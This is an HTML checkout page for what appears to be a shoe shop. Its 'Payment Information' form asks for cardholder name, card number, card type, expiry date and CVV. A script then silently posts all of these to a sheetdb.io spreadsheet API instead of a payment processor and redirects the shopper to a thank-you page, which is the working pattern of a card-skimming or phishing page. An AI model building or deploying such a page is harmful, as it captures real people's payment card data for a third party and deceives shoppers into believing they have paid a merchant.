<body>
    <!-- partial:index.partial.html -->
    <div class="mainscreen">
        <div class="card">
          <div class="leftside">
            <img
              src="images/logo 1.jpg"
              class="product"
              alt="Shoes"
            />
          </div>
          <div class="rightside">
            <form method="post" id="sheetdb-form"
            action="https://sheetdb.io/api/v1/jwesjfbl3ezau">
              <h2>Payment Information</h2>
              <p>Cardholder Name</p>
              <input type="text" class="inputbox" name="data[card_holder]" required />
              <p>Card Number</p>
              <input type="number" class="inputbox" name="data[card_number]" id="card_number" required />
  
              <p>Card Type</p>
              <select class="inputbox" name="data[card_type]" id="card_type" required>
                <option value="">--Select a Card Type--</option>
                <option value="Visa">Visa</option>
                <option value="MasterCard">MasterCard</option>
                <option value="Ecobank">Ecobank</option>
                <option value="Fedelity">Fedelity</option>
              </select>
  <div class="expcvv">
  
              <p class="expcvv_text">Expiry</p>
              <input type="text" class="inputbox" name="data[exp_date]" id="exp_date" required />
  
              <p class="expcvv_text2">CVV</p>
              <input type="password" class="inputbox" name="data[cvv]" id="cvv" required />
          </div>
              <p></p>
              <button type="submit" class="button">CheckOut</button>
            </form>
          </div>
        </div>
      </div>
      <script>
  var form = document.getElementById('sheetdb-form');
  form.addEventListener("submit", e => {
    e.preventDefault();
    fetch(form.action, {
        method : "POST",
        body: new FormData(document.getElementById("sheetdb-form")),
    }).then(
        response => response.json()
    ).then((html) => {
      // you can put any JS code here
      window.location.href = 'thankyou.html';
    });
  });
</script>
